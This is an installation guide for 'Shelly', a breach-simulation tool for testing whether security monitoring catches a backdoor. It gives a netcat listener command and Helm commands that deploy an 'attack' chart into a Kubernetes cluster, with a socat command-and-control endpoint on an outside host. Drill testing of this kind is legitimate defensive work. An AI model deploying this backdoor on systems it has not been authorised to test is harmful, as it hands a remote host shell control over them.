===================================
Getting started with Shelly in your Cluster(Linux)
===================================

Araali Shelly is an open source tool that helps security teams safely test their detect and
response readiness (the fire drill for SIEM/SOAR/EDR/NDR/XDR investment) for backdoors. 
This is typical when supply chain vulnerabilities like remote code execution (RCE) are 
exploited and represents a doomsday scenario where an attacker has full remote control 
capabilities based on the backdoor.

Step 0: Setting up the Backdoor Server (Optional, if you choose to use Araali Backdoor, see next steps)
***********************************************************************************************************
Run a cloud VM where you can listen for incoming connections (you can use a small t2-micro). 
Note down the external IP address of this machine (will be used later on).
You can also dial out to Araali’s backdoor-as-a-service -nightly.aws.araalinetworks.com:443

Join our `Slack Channel <https://araali.slack.com/join/shared_invite/zt-o3yeo8us-GRa7qtz4p0kcIVIBaIxWbA#/shared-invite/email>` if you need any help

Install net cat and listen for incoming connections::

    sudo nc -nvlp 443

We suggest you run Shelly after `installing Araali <https://araali-networks-api.readthedocs.io/en/latest/gettingstarted.html>`. By doing so, Shelly is safely run in a no harm sandbox.


Step 1: Setup Shelly in your Cluster
************************************
 Setup Helm Repo::

    helm repo add araali-helm https://araalinetworks.github.io/araali-helm/

Create namespace::

    kubectl create ns araali-attack


**If you are using your own Backdoor**
    #Install Shelly on your cluster running Araali::

        helm install attack araali-helm/araali-attack -n araali-attack --set araali.zone=<araali-zone> --set araali.socat_c2c_endpoint=<ip-of-cloud-server>:443

    OR

    #Install Shelly on your cluster NOT running Araali::
        
        helm install attack araali-helm/araali-attack -n araali-attack --set araali.include_policy_as_code=false --set araali.socat_c2c_endpoint=<ip-of-cloud-server:443>
    

**If you are using Araali as a backdoor service**

    #Install Shelly on your cluster running Araali::
        
        helm install attack araali-helm/araali-attack -n araali-attack --set araali.zone=demo --set araali.socat_c2c_endpoint=backdoor-nightly.aws.araalinetworks.com:443
    
    OR

    #Install Shelly on your cluster NOT running Araali::

        helm install attack araali-helm/araali-attack -n araali-attack --set araali.include_policy_as_code=false --araali.socat_c2c_endpoint=backdoor-nightly.aws.araalinetworks.com:443



Step 2: Check if Shelly got installed correctly
***********************************************
    Check if the pods are up and running::

        kubectl get po -A

If you are facing trouble installing Shelly, please refer to the
 `installation video <https://vimeo.com/696308067?embedded=true&source=vimeo_logo&owner=114861097>` by our staff.

**How to uninstall Shelly?**

Run the following command to uninstall Shelly from your cluster::
    
    helm uninstall attack -n araali-attack



    
















